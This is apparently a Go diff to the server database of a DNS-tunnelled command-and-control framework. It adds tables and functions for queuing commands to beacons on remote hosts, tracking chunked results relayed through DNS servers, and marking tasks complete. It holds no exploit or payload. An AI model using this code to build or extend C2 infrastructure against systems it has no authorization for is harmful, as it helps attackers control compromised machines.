@@ -222,6 +222,25 @@ func (d *MasterDatabase) migration1InitialSchema() error {
 	CREATE INDEX IF NOT EXISTS idx_task_results_dns_server ON task_results(dns_server_id);
 	CREATE INDEX IF NOT EXISTS idx_task_results_received_at ON task_results(received_at);
 
+	-- Task progress table (track real-time progress from DNS servers)
+	CREATE TABLE IF NOT EXISTS task_progress (
+		id INTEGER PRIMARY KEY AUTOINCREMENT,
+		task_id TEXT NOT NULL,
+		beacon_id TEXT NOT NULL,
+		dns_server_id TEXT NOT NULL,
+		received_chunks INTEGER NOT NULL DEFAULT 0,
+		total_chunks INTEGER NOT NULL DEFAULT 1,
+		status TEXT NOT NULL DEFAULT 'pending',
+		last_updated INTEGER NOT NULL,
+		FOREIGN KEY (task_id) REFERENCES tasks(id) ON DELETE CASCADE,
+		FOREIGN KEY (beacon_id) REFERENCES beacons(id) ON DELETE CASCADE,
+		FOREIGN KEY (dns_server_id) REFERENCES dns_servers(id) ON DELETE CASCADE,
+		UNIQUE(task_id, dns_server_id)
+	);
+
+	CREATE INDEX IF NOT EXISTS idx_task_progress_task_id ON task_progress(task_id);
+	CREATE INDEX IF NOT EXISTS idx_task_progress_status ON task_progress(status);
+
 	-- Operators table (multi-user support)
 	CREATE TABLE IF NOT EXISTS operators (
 		id TEXT PRIMARY KEY,
@@ -469,6 +488,43 @@ func (d *MasterDatabase) GetActiveBeacons(minutesThreshold int) ([]map[string]in
 	return beacons, rows.Err()
 }
 
+// GetBeacon retrieves details for a specific beacon by ID
+func (d *MasterDatabase) GetBeacon(beaconID string) (map[string]interface{}, error) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	var id, hostname, username, os, arch, ipAddress, dnsServerID, status string
+	var firstSeen, lastSeen int64
+
+	err := d.db.QueryRow(`
+		SELECT id, hostname, username, os, arch, ip_address, dns_server_id, first_seen, last_seen, status
+		FROM beacons
+		WHERE id = ?
+	`, beaconID).Scan(&id, &hostname, &username, &os, &arch, &ipAddress, &dnsServerID, &firstSeen, &lastSeen, &status)
+
+	if err == sql.ErrNoRows {
+		return nil, nil // Beacon not found
+	}
+	if err != nil {
+		return nil, err
+	}
+
+	beacon := map[string]interface{}{
+		"id":            id,
+		"hostname":      hostname,
+		"username":      username,
+		"os":            os,
+		"arch":          arch,
+		"ip_address":    ipAddress,
+		"dns_server_id": dnsServerID,
+		"first_seen":    time.Unix(firstSeen, 0).Format(time.RFC3339),
+		"last_seen":     time.Unix(lastSeen, 0).Format(time.RFC3339),
+		"status":        status,
+	}
+
+	return beacon, nil
+}
+
 // Task Result operations
 
 // SaveResultChunk stores a result chunk from a DNS server
@@ -506,6 +562,8 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 				if err == nil {
 					fmt.Printf("[Master DB] Received complete assembled result from %s: task %s, %d chunks, %d bytes\n",
 						dnsServerID, taskID, totalChunks, len(data))
+					// Mark task as completed
+					d.markTaskCompleted(taskID)
 				}
 				return err
 			}
@@ -522,6 +580,11 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 
 	if err != nil {
 		return err
+	}
+
+	// If this was a complete single-chunk result, mark task as completed
+	if isComplete == 1 && totalChunks == 1 {
+		d.markTaskCompleted(taskID)
 	}
 
 	// If this is a multi-chunk result (and not the complete assembled one), check if we have all chunks
@@ -633,6 +696,9 @@ func (d *MasterDatabase) reassembleChunkedResult(taskID, beaconID string, totalC
 		fmt.Printf("[Master DB] Error storing assembled result: %v\n", err)
 		return
 	}
+
+	// Mark task as completed
+	d.markTaskCompleted(taskID)
 
 	fmt.Printf("[Master DB] ✓ Reassembled result for task %s: %d chunks, %d bytes\n",
 		taskID, totalChunks, completeResult.Len())
@@ -845,6 +911,41 @@ func (d *MasterDatabase) GetEnabledDNSDomains() ([]string, error) {
 	return domains, rows.Err()
 }
 
+// CreateTask creates a new task for a specific beacon
+func (d *MasterDatabase) CreateTask(beaconID, command, createdBy string) (string, error) {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	// Get the beacon's assigned DNS server
+	var dnsServerID string
+	err := d.db.QueryRow(`
+		SELECT dns_server_id FROM beacons WHERE id = ? AND status = 'active'
+	`, beaconID).Scan(&dnsServerID)
+	
+	if err != nil {
+		if err == sql.ErrNoRows {
+			return "", fmt.Errorf("beacon not found or inactive")
+		}
+		return "", fmt.Errorf("failed to get beacon info: %w", err)
+	}
+
+	// Generate task ID
+	taskID := generateTaskID()
+	now := time.Now().Unix()
+
+	// Create task
+	_, err = d.db.Exec(`
+		INSERT INTO tasks (id, beacon_id, command, status, assigned_dns_server, created_by, created_at)
+		VALUES (?, ?, ?, 'pending', ?, ?, ?)
+	`, taskID, beaconID, command, dnsServerID, createdBy, now)
+
+	if err != nil {
+		return "", fmt.Errorf("failed to create task: %w", err)
+	}
+
+	return taskID, nil
+}
+
 // GetTasksForDNSServer retrieves pending tasks assigned to a DNS server's beacons
 func (d *MasterDatabase) GetTasksForDNSServer(dnsServerID string) ([]map[string]interface{}, error) {
 	d.mutex.RLock()
@@ -880,6 +981,351 @@ func (d *MasterDatabase) GetTasksForDNSServer(dnsServerID string) ([]map[string]
 	}
 
 	return tasks, rows.Err()
+}
+
+// GetAllTasks retrieves all tasks with their status
+func (d *MasterDatabase) GetAllTasks(limit int) ([]map[string]interface{}, error) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	query := `
+		SELECT t.id, t.beacon_id, t.command, t.status, t.created_at, t.completed_at,
+		       b.hostname, b.username, b.os
+		FROM tasks t
+		LEFT JOIN beacons b ON t.beacon_id = b.id
+		ORDER BY t.created_at DESC
+	`
+	
+	if limit > 0 {
+		query += fmt.Sprintf(" LIMIT %d", limit)
+	}
+
+	rows, err := d.db.Query(query)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+
+	var tasks []map[string]interface{}
+	for rows.Next() {
+		var id, beaconID, command, status string
+		var hostname, username, os sql.NullString
+		var createdAt int64
+		var completedAt sql.NullInt64
+
+		if err := rows.Scan(&id, &beaconID, &command, &status, &createdAt, &completedAt,
+			&hostname, &username, &os); err != nil {
+			continue
+		}
+
+		task := map[string]interface{}{
+			"id":         id,
+			"beacon_id":  beaconID,
+			"command":    command,
+			"status":     status,
+			"created_at": time.Unix(createdAt, 0).Format(time.RFC3339),
+		}
+
+		if completedAt.Valid {
+			task["completed_at"] = time.Unix(completedAt.Int64, 0).Format(time.RFC3339)
+		}
+
+		if hostname.Valid {
+			task["hostname"] = hostname.String
+		}
+		if username.Valid {
+			task["username"] = username.String
+		}
+		if os.Valid {
+			task["os"] = os.String
+		}
+
+		tasks = append(tasks, task)
+	}
+
+	return tasks, rows.Err()
+}
+
+// GetTaskWithResult retrieves a task and its result if completed
+func (d *MasterDatabase) GetTaskWithResult(taskID string) (map[string]interface{}, error) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	var id, beaconID, command, status string
+	var createdBy sql.NullString
+	var createdAt, sentAt, completedAt sql.NullInt64
+
+	err := d.db.QueryRow(`
+		SELECT id, beacon_id, command, status, created_by, created_at, sent_at, completed_at
+		FROM tasks
+		WHERE id = ?
+	`, taskID).Scan(&id, &beaconID, &command, &status, &createdBy, &createdAt, &sentAt, &completedAt)
+
+	if err != nil {
+		if err == sql.ErrNoRows {
+			return nil, fmt.Errorf("task not found")
+		}
+		return nil, err
+	}
+
+	task := map[string]interface{}{
+		"id":        id,
+		"beacon_id": beaconID,
+		"command":   command,
+		"status":    status,
+	}
+
+	if createdBy.Valid {
+		task["created_by"] = createdBy.String
+	}
+	if createdAt.Valid {
+		task["created_at"] = time.Unix(createdAt.Int64, 0).Format(time.RFC3339)
+	}
+	if sentAt.Valid {
+		task["sent_at"] = time.Unix(sentAt.Int64, 0).Format(time.RFC3339)
+	}
+	if completedAt.Valid {
+		task["completed_at"] = time.Unix(completedAt.Int64, 0).Format(time.RFC3339)
+	}
+
+	// Get result if task is completed
+	if status == "completed" {
+		result, isComplete, err := d.GetTaskResult(taskID)
+		if err == nil && isComplete {
+			task["result"] = result
+			task["result_size"] = len(result)
+		}
+	} else if status == "sent" {
+		// Task is in progress, calculate progress from actual received chunks
+		progress, err := d.GetTaskProgressFromResults(taskID)
+		if err == nil {
+			task["progress"] = progress
+		}
+	}
+
+	return task, nil
+}
+
+// MarkTasksSent marks tasks as 'sent' after they are retrieved by a DNS server
+func (d *MasterDatabase) MarkTasksSent(taskIDs []string) error {
+	if len(taskIDs) == 0 {
+		return nil
+	}
+
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	now := time.Now().Unix()
+
+	// Build placeholders for SQL IN clause
+	placeholders := make([]string, len(taskIDs))
+	args := make([]interface{}, len(taskIDs)+1)
+	args[0] = now
+	
+	for i, taskID := range taskIDs {
+		placeholders[i] = "?"
+		args[i+1] = taskID
+	}
+
+	query := fmt.Sprintf(`
+		UPDATE tasks 
+		SET status = 'sent', sent_at = ?
+		WHERE id IN (%s) AND status = 'pending'
+	`, strings.Join(placeholders, ","))
+
+	_, err := d.db.Exec(query, args...)
+	return err
+}
+
+// UpdateTaskProgress updates or creates task progress from a DNS server
+func (d *MasterDatabase) UpdateTaskProgress(taskID, beaconID, dnsServerID string, receivedChunks, totalChunks int, status string) error {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	now := time.Now().Unix()
+
+	_, err := d.db.Exec(`
+		INSERT INTO task_progress (task_id, beacon_id, dns_server_id, received_chunks, total_chunks, status, last_updated)
+		VALUES (?, ?, ?, ?, ?, ?, ?)
+		ON CONFLICT(task_id, dns_server_id) 
+		DO UPDATE SET 
+			received_chunks = excluded.received_chunks,
+			total_chunks = excluded.total_chunks,
+			status = excluded.status,
+			last_updated = excluded.last_updated
+	`, taskID, beaconID, dnsServerID, receivedChunks, totalChunks, status, now)
+
+	return err
+}
+
+// GetTaskProgress retrieves aggregated progress for a task across all DNS servers
+// NOTE: This function is kept for DNS server progress reporting but is not used
+// for operator-facing progress display. Use GetTaskProgressFromResults instead.
+func (d *MasterDatabase) GetTaskProgress(taskID string) (map[string]interface{}, error) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	// Get overall progress - sum all received chunks from different servers
+	var totalReceived, totalExpected int
+	var status string
+	
+	err := d.db.QueryRow(`
+		SELECT 
+			COALESCE(SUM(received_chunks), 0) as total_received,
+			MAX(total_chunks) as total_expected,
+			CASE 
+				WHEN MAX(status) = 'complete' THEN 'complete'
+				WHEN MAX(status) = 'assembling' THEN 'assembling'
+				WHEN SUM(received_chunks) > 0 THEN 'receiving'
+				ELSE 'pending'
+			END as overall_status
+		FROM task_progress
+		WHERE task_id = ?
+	`, taskID).Scan(&totalReceived, &totalExpected, &status)
+
+	if err == sql.ErrNoRows {
+		return map[string]interface{}{
+			"task_id":         taskID,
+			"received_chunks": 0,
+			"total_chunks":    0,
+			"progress":        0,
+			"status":          "pending",
+		}, nil
+	}
+	if err != nil {
+		return nil, err
+	}
+
+	progress := 0
+	if totalExpected > 0 {
+		progress = (totalReceived * 100) / totalExpected
+		if progress > 100 {
+			progress = 100 // Cap at 100% in case of duplicates
+		}
+	}
+
+	return map[string]interface{}{
+		"task_id":         taskID,
+		"received_chunks": totalReceived,
+		"total_chunks":    totalExpected,
+		"progress":        progress,
+		"status":          status,
+	}, nil
+}
+
+// GetTaskProgressFromResults calculates actual progress from task_results table
+// This is the authoritative source for progress as it reflects what the Master has received
+// With distributed chunks, this aggregates data from all DNS servers
+func (d *MasterDatabase) GetTaskProgressFromResults(taskID string) (map[string]interface{}, error) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	// First check if we have a complete result
+	var completeExists int
+	err := d.db.QueryRow(`
+		SELECT COUNT(*) FROM task_results
+		WHERE task_id = ? AND chunk_index = 0 AND is_complete = 1
+	`, taskID).Scan(&completeExists)
+
+	if err != nil {
+		return nil, err
+	}
+
+	if completeExists > 0 {
+		// Task is complete
+		return map[string]interface{}{
+			"task_id":         taskID,
+			"received_chunks": -1, // Not applicable for complete
+			"total_chunks":    -1,
+			"progress":        100,
+			"status":          "complete",
+		}, nil
+	}
+
+	// Get total expected chunks from task_results (RESULT_META chunk or max total_chunks)
+	var totalExpected sql.NullInt64
+	err = d.db.QueryRow(`
+		SELECT MAX(total_chunks) FROM task_results
+		WHERE task_id = ? AND total_chunks > 1
+		LIMIT 1
+	`, taskID).Scan(&totalExpected)
+
+	if err != nil && err != sql.ErrNoRows {
+		return nil, err
+	}
+
+	// If no metadata in task_results yet, try DNS server progress reports
+	if !totalExpected.Valid || totalExpected.Int64 <= 0 {
+		var progressTotal sql.NullInt64
+		err = d.db.QueryRow(`
+			SELECT MAX(total_chunks) FROM task_progress
+			WHERE task_id = ? AND total_chunks > 0
+		`, taskID).Scan(&progressTotal)
+		
+		if err == nil && progressTotal.Valid && progressTotal.Int64 > 0 {
+			totalExpected = progressTotal
+		}
+	}
+
+	if !totalExpected.Valid || totalExpected.Int64 <= 0 {
+		// No chunks received yet or single-chunk result
+		return map[string]interface{}{
+			"task_id":         taskID,
+			"received_chunks": 0,
+			"total_chunks":    0,
+			"progress":        0,
+			"status":          "pending",
+		}, nil
+	}
+
+	// Count unique chunks received (excluding metadata chunk at index 0)
+	var receivedChunks int
+	err = d.db.QueryRow(`
+		SELECT COUNT(DISTINCT chunk_index) FROM task_results
+		WHERE task_id = ? AND chunk_index > 0
+	`, taskID).Scan(&receivedChunks)
+
+	if err != nil {
+		return nil, err
+	}
+
+	progress := 0
+	if totalExpected.Int64 > 0 {
+		progress = int((int64(receivedChunks) * 100) / totalExpected.Int64)
+		if progress > 100 {
+			progress = 100
+		}
+	}
+
+	status := "receiving"
+	if receivedChunks == 0 {
+		status = "pending"
+	} else if receivedChunks >= int(totalExpected.Int64) {
+		status = "assembling"
+	}
+
+	return map[string]interface{}{
+		"task_id":         taskID,
+		"received_chunks": receivedChunks,
+		"total_chunks":    int(totalExpected.Int64),
+		"progress":        progress,
+		"status":          status,
+	}, nil
+}
+
+// markTaskCompleted updates a task's status to 'completed'
+// This is called internally (mutex already held by caller)
+func (d *MasterDatabase) markTaskCompleted(taskID string) {
+	now := time.Now().Unix()
+	_, err := d.db.Exec(`
+		UPDATE tasks 
+		SET status = 'completed', completed_at = ?
+		WHERE id = ? AND status != 'completed'
+	`, now, taskID)
+	
+	if err != nil {
+		fmt.Printf("[Master DB] Error marking task %s as completed: %v\n", taskID, err)
+	}
 }
 
 // LogAuditEvent logs an operator action to the audit log
